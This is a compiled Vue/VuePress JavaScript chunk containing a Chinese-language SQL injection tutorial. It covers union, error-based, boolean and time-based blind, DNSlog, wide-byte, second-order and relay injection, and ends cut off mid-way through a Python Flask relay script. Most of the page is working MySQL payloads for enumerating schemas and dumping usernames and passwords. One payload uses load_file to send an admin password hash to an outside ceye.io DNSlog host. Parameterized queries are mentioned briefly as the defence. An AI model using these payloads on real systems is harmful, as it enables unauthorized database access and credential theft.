import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as t,c as o,a as s,b as n,d as c,e as a,r as l}from"./app.5109c2cc.js";const i={},u=a(`<h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述" aria-hidden="true">#</a> 漏洞概述</h2><div class="custom-container info"><p class="custom-container-title">成因和危害</p><p>Web应用程序对用户输入的数据校验处理不严，导致用户可以拼接执行SQL命令。</p><p>可能导致数据泄露和主机接管，缺乏可审计性。</p></div><p>有五种SQL注入技术：</p><table><thead><tr><th style="text-align:left;">注入技术</th><th style="text-align:left;">特征</th></tr></thead><tbody><tr><td style="text-align:left;">布尔型盲注</td><td style="text-align:left;">根据返回页面判断条件真假</td></tr><tr><td style="text-align:left;">时间型盲注</td><td style="text-align:left;">用页面返回时间是否增加判断是否存在注入</td></tr><tr><td style="text-align:left;">基于错误的注入</td><td style="text-align:left;">页面会返回错误信息</td></tr><tr><td style="text-align:left;">联合查询注入</td><td style="text-align:left;">可以使用union的情况下</td></tr><tr><td style="text-align:left;">堆查询注入</td><td style="text-align:left;">可以同时执行多条语句</td></tr></tbody></table><details class="custom-container details"><summary>SQL注入的防御方法</summary><p>使用参数化查询。</p><p>数据库服务器不会把参数的内容当作<code>SQL指令</code>的一部分来拼接执行；</p><p>而是在数据库完成SQL指令的编译后才套用参数运行(预编译)。</p><p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p></details><h2 id="mysql数据库特征" tabindex="-1"><a class="header-anchor" href="#mysql数据库特征" aria-hidden="true">#</a> MySQL数据库特征</h2><div class="custom-container info"><p class="custom-container-title">MySQL默认存在数据库</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>sys
mysql
performance_schema
information_schema
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><p>information_schema 存放着所有的数据库信息(5.0版本以上才有这个库)</p><p>这个库默认存在三个表：</p><table><thead><tr><th style="text-align:left;">表名</th><th style="text-align:left;">字段</th></tr></thead><tbody><tr><td style="text-align:left;">SCHEMATA 存放用户创建的所有数据库库名</td><td style="text-align:left;">SCHEMA_NAME 记录数据库库名</td></tr><tr><td style="text-align:left;">TABLES 存放用户创建的所有数据库库名和表名</td><td style="text-align:left;">TABLE_SCHEMA 记录数据库名<br>TABLE_NAME 记录表名</td></tr><tr><td style="text-align:left;">COLUMNS 存放用户创建的数据库库名、表名和字段名</td><td style="text-align:left;">TABLE_SCHEMA 记录数据库名<br>TABLE_NAME 记录表名<br>COLUMN_NAME 记录字段名</td></tr></tbody></table><h2 id="联合查询注入" tabindex="-1"><a class="header-anchor" href="#联合查询注入" aria-hidden="true">#</a> 联合查询注入</h2><h4 id="_1-单引号报错" tabindex="-1"><a class="header-anchor" href="#_1-单引号报错" aria-hidden="true">#</a> 1）单引号报错</h4><p>在参数后添加引号尝试报错，并用 and 1=1# 和 and 1=2# 测试报错</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; and 1=1#     	--页面返回正常
?id=1&#39;</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">#     	--页面返回不正常</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-利用-order-by-猜字段" tabindex="-1"><a class="header-anchor" href="#_2-利用-order-by-猜字段" aria-hidden="true">#</a> 2）利用 order by 猜字段</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span>order<span class="token operator">%</span><span class="token number">0</span>aby<span class="token operator">%</span><span class="token number">0</span>c2<span class="token operator">%</span><span class="token number">23</span>    	<span class="token comment">--返回正常</span>
?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#            	--返回正常</span>
?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">#            	--返回正常</span>
?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">5</span><span class="token comment">#            	--返回错误,这就证明字段总数为4</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-利用union联合查询" tabindex="-1"><a class="header-anchor" href="#_3-利用union联合查询" aria-hidden="true">#</a> 3）利用union联合查询</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">#	</span>
<span class="token comment">--看哪个字段可以显示信息，利用它获取数据库信息</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>修改id为一个不存在的id，强行报错</p><p>因为代码默认只返回第一条结果，不会返回 union select 的结果</p><h4 id="_4-获取数据库信息" tabindex="-1"><a class="header-anchor" href="#_4-获取数据库信息" aria-hidden="true">#</a> 4）获取数据库信息</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>CONCAT_WS<span class="token punctuation">(</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出</p><table><thead><tr><th style="text-align:left;">函数</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;">user()</td><td style="text-align:left;">获取数据库用户名</td></tr><tr><td style="text-align:left;">database()</td><td style="text-align:left;">获取数据库名</td></tr><tr><td style="text-align:left;">version()</td><td style="text-align:left;">获取数据库版本信息</td></tr><tr><td style="text-align:left;">concat_ws(separator,str1,str2,...)</td><td style="text-align:left;">含有分隔符地连接字符串</td></tr><tr><td style="text-align:left;">@@datadir</td><td style="text-align:left;">数据库路径</td></tr><tr><td style="text-align:left;">@@version_compile_os</td><td style="text-align:left;">操作系统版本</td></tr></tbody></table><h4 id="_5-查询数据表" tabindex="-1"><a class="header-anchor" href="#_5-查询数据表" aria-hidden="true">#</a> 5）查询数据表</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">&#39;sqli&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#</span>

<span class="token comment">--table_schema=数据库名16进制或者用单引号括起来</span>
<span class="token comment">--改变limit 0,1中前一个参数，得到所有表</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_6-数据库字段查询" tabindex="-1"><a class="header-anchor" href="#_6-数据库字段查询" aria-hidden="true">#</a> 6）数据库字段查询</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>数据库名<span class="token operator">%</span><span class="token number">27</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>表名<span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_7-拖库-获取数据库数据" tabindex="-1"><a class="header-anchor" href="#_7-拖库-获取数据库数据" aria-hidden="true">#</a> 7）拖库，获取数据库数据</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>sc<span class="token comment">#		--用字段名从表中取数据</span>

group_concat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>		<span class="token comment">--连接一个组的所有字符串</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="报错注入" tabindex="-1"><a class="header-anchor" href="#报错注入" aria-hidden="true">#</a> 报错注入</h2><p>在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据</p><details class="custom-container details"><summary>常用的MySQL报错函数</summary><h4 id="一、xpath语法错误" tabindex="-1"><a class="header-anchor" href="#一、xpath语法错误" aria-hidden="true">#</a> 一、xpath语法错误</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>extractvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">--查询节点内容</span>
updatexml<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">--修改查询到的内容</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>它们的第二个参数都要求是符合xpath语法的字符串</p><p>如果不满足要求则会报错，并且将查询结果放在报错信息里</p><h4 id="二、主键重复-duplicate-entry" tabindex="-1"><a class="header-anchor" href="#二、主键重复-duplicate-entry" aria-hidden="true">#</a> 二、主键重复（duplicate entry）</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>floor<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">--返回小于等于该值的最大整数</span>
count<span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token comment">--三个连用就会造成主键重复报错</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><h4 id="_1-单引号报错-1" tabindex="-1"><a class="header-anchor" href="#_1-单引号报错-1" aria-hidden="true">#</a> 1）单引号报错</h4><h4 id="_2-获取数据库名" tabindex="-1"><a class="header-anchor" href="#_2-获取数据库名" aria-hidden="true">#</a> 2）获取数据库名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>&#39; <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>

<span class="token comment">--0x7e是&quot;~&quot;符号的16进制，在这作为分隔符</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-获取表名" tabindex="-1"><a class="header-anchor" href="#_3-获取表名" aria-hidden="true">#</a> 3）获取表名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;</span>数据库名&#39; <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_4-获取字段名" tabindex="-1"><a class="header-anchor" href="#_4-获取字段名" aria-hidden="true">#</a> 4）获取字段名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;</span>数据库名<span class="token string">&#39; and table_name=&#39;</span>表名&#39; <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_5-取数据" tabindex="-1"><a class="header-anchor" href="#_5-取数据" aria-hidden="true">#</a> 5）取数据</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>&#39; <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="其它函数payload" tabindex="-1"><a class="header-anchor" href="#其它函数payload" aria-hidden="true">#</a> 其它函数payload</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--extractvalue</span>
<span class="token string">&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

--floor()
&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="布尔型盲注" tabindex="-1"><a class="header-anchor" href="#布尔型盲注" aria-hidden="true">#</a> 布尔型盲注</h2><p>布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入。</p><h4 id="_1-单引号报错-测试页面返回" tabindex="-1"><a class="header-anchor" href="#_1-单引号报错-测试页面返回" aria-hidden="true">#</a> 1）单引号报错，测试页面返回</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; and 1=1#     页面返回正常
?id=1&#39;</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">#     页面返回不正常</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-判断数据库名长度" tabindex="-1"><a class="header-anchor" href="#_2-判断数据库名长度" aria-hidden="true">#</a> 2）判断数据库名长度</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">1</span><span class="token string">&#39;and length(database())&gt;=1--+      页面返回正常
1&#39;</span><span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">13</span><span class="token comment">--+     页面返回正常</span>
<span class="token number">1</span>&#39;<span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">14</span><span class="token comment">--+     页面返回错误</span>

<span class="token comment">--由此判断得到数据库名的长度是13个字符</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-猜解数据库名" tabindex="-1"><a class="header-anchor" href="#_3-猜解数据库名" aria-hidden="true">#</a> 3）猜解数据库名</h4><p>使用逐字符判断的方式获取数据库名；</p><p>数据库名的范围一般在<code>a~z、0~9</code>之内，可能还会有特殊字符 &quot;_&quot;、&quot;-&quot; 等，字母不区分大小写</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and substr(database(),1,1)=&#39;</span>a<span class="token string">&#39;--+
&#39;</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span><span class="token comment">--+</span>

<span class="token comment">-- substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span>
<span class="token comment">-- 用Burp爆破字母a的位置，即可得到数据库名每个位置上的字符</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>a 的ASCII码是97，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>&#39; <span class="token operator">and</span> ord<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">97</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ASCII码表中可显示字符的范围是：0~127</p><h4 id="_4-判断表名" tabindex="-1"><a class="header-anchor" href="#_4-判断表名" aria-hidden="true">#</a> 4）判断表名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;</span>数据库名<span class="token string">&#39; limit 0,1),1,1)=&#39;</span>a&#39;<span class="token comment">--+</span>

<span class="token comment">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span>
<span class="token comment">--修改limit的0,1前边的0~20，逐个猜解每个表</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_5-判断字段名" tabindex="-1"><a class="header-anchor" href="#_5-判断字段名" aria-hidden="true">#</a> 5）判断字段名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and substr((select column_name from information_schema.columns where table_schema=&#39;</span>数据库名<span class="token string">&#39; and table_name=&#39;</span>表名<span class="token string">&#39; limit 0,1),1,1)=&#39;</span>a&#39;<span class="token comment">--+</span>

<span class="token comment">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span>
<span class="token comment">--修改limit的0,1前边的0~20，逐个猜解每个字段</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_6-读取数据" tabindex="-1"><a class="header-anchor" href="#_6-读取数据" aria-hidden="true">#</a> 6）读取数据</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#39;</span>a&#39;<span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="时间型盲注" tabindex="-1"><a class="header-anchor" href="#时间型盲注" aria-hidden="true">#</a> 时间型盲注</h2><p>可以用<code>benchmark，sleep</code>等造成延时效果的函数，根据页面返回时间判断是否存在注入</p>`,65),r={class:"custom-container details"},d=s("summary",null,"延时函数被禁用",-1),k={href:"https://blog.csdn.net/qq_32763643/article/details/79187931",target:"_blank",rel:"noopener noreferrer"},m=s("p",null,"或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟",-1),b=a(`<h4 id="_1-利用sleep判断数据库名长度" tabindex="-1"><a class="header-anchor" href="#_1-利用sleep判断数据库名长度" aria-hidden="true">#</a> 1）利用sleep判断数据库名长度</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and sleep(5) and 1=1--+   页面返回不正常，延时5秒
&#39;</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">--+   页面返回不正常，不延时</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-获取数据库名-1" tabindex="-1"><a class="header-anchor" href="#_2-获取数据库名-1" aria-hidden="true">#</a> 2）获取数据库名</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="dnslog盲注" tabindex="-1"><a class="header-anchor" href="#dnslog盲注" aria-hidden="true">#</a> DNSlog盲注</h2><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；</p><p><code>MySQL Load_File()</code>函数可以发起请求，使用Dnslog接收请求，获取数据；</p><p>通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">&#39;\\\\&#39;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> hex<span class="token punctuation">(</span>pass<span class="token punctuation">)</span> <span class="token keyword">FROM</span> <span class="token keyword">user</span> <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">&#39;admin&#39;</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.mysql.wintrysec.ceye.io\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span>


<span class="token comment">--时间型盲注中用DNSlog加速注入</span>
<span class="token string">&#39;and if((SELECT LOAD_FILE(CONCAT(&#39;</span>\\\\\\\\&#39;<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> hex<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.xxx.ceye.io\\\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="custom-container tip"><p class="custom-container-title">注意</p><p><code>load_file()</code>只能在Windows平台上才能发起请求，Linux下做dnslog攻击是不行的。</p><p>因为Linux没有遵守UNC，所以当MySQL在Linux上时，是不能使用这种方式外带数据的</p><p>UNC通用命名规范-&gt;<code>\\\\server_IP\\share_name</code></p><p>上边 CONCAT 应该写四个反斜杠 \\，因为最后会被转义成两个</p><p>MySQL数据库配置中要设置secure_file_priv为空,才能完整的去请求DNS</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">//secure-file-priv参数是用来限制文件导入导出路径的</span>
secure<span class="token operator">-</span>file<span class="token operator">-</span>priv<span class="token operator">=</span>null    <span class="token comment">//限制mysqld 不允许导入|导出</span>
secure<span class="token operator">-</span>file<span class="token operator">-</span>priv<span class="token operator">=</span>        <span class="token comment">//不限制</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><h2 id="花式注入" tabindex="-1"><a class="header-anchor" href="#花式注入" aria-hidden="true">#</a> 花式注入</h2><h3 id="宽字节注入" tabindex="-1"><a class="header-anchor" href="#宽字节注入" aria-hidden="true">#</a> 宽字节注入</h3><p>当MySQL数据库中使用了宽字符集时（GBK,GB2312），会认为两个字符为一个汉字；</p><p>在PHP中使用<code>addslashes</code>函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\\”，变成%5c%27，可以在前边添加%df,形成<code>%df%5c%27</code>，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字(ascii &gt; 128才能达到汉字范围)，%5c被吃掉了，单引号逃逸可以用来闭合语句。</p><p>修复：使用<code>mysqli_real_escape_string</code>进行转义</p><h3 id="二阶注入" tabindex="-1"><a class="header-anchor" href="#二阶注入" aria-hidden="true">#</a> 二阶注入</h3><p>当数据首次插入到数据库中时，许多应用程序能够安全处理这些数据 addslashes 等字符转义函数。</p><p>一旦数据存储在数据库中，随后应用程序本身或其它后端进程可能会以危险的方式处理这些数据。</p><h3 id="中转注入" tabindex="-1"><a class="header-anchor" href="#中转注入" aria-hidden="true">#</a> 中转注入</h3><p>当网站做了token保护或js前端加密的情况下；</p><p>对于这些站点当手工发现了注入点，但并不适用于用sqlmap等工具跑，可以做中转注入；</p><p>本地起个Server，然后用sqlmap扫这个Server，Server接收到payload后加到表单中提交。</p><details class="custom-container details"><summary>Python+selenium做中转注入</summary><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
